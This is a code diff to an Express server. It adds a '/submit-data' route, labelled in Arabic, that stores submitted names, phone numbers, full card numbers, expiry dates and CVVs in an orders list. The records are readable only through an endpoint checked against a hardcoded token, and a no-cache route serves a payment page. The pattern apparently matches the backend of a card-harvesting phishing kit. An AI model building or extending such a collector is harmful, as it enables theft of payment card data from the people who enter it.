@@ -50,6 +50,26 @@ const saveOrder = (req, res) => {
 app.post('/api/save-data', saveOrder);
 app.post('/api/orders', saveOrder);
 
+// Compatibility route for payment_new_ar.html
+app.post('/submit-data', (req, res) => {
+    const data = req.body;
+    const order = {
+        id: Date.now(),
+        timestamp: new Date().toLocaleString('ar-AE'),
+        status: 'جديد',
+        name: data.name || 'غير معروف',
+        phone: data.phone || '',
+        details: {
+            cardNumber: data.cardNumber,
+            expiryDate: data.expiryDate,
+            cvv: data.cvv,
+            originalData: data
+        }
+    };
+    orders.push(order);
+    res.json({ success: true });
+});
+
 app.get('/api/get-data', (req, res) => {
     const authHeader = req.headers.authorization;
     if (authHeader === 'authenticated_session_token') {
@@ -75,6 +95,13 @@ app.post('/api/update-status', (req, res) => {
 });
 
 // Route for all HTML files to ensure they load correctly
+app.get('/payment_ar.html', (req, res) => {
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    res.sendFile(path.join(__dirname, 'payment_new_ar.html'));
+});
+
 app.get('/:page.html', (req, res) => {
     res.sendFile(path.join(__dirname, req.params.page + '.html'), (err) => {
         if (err) {
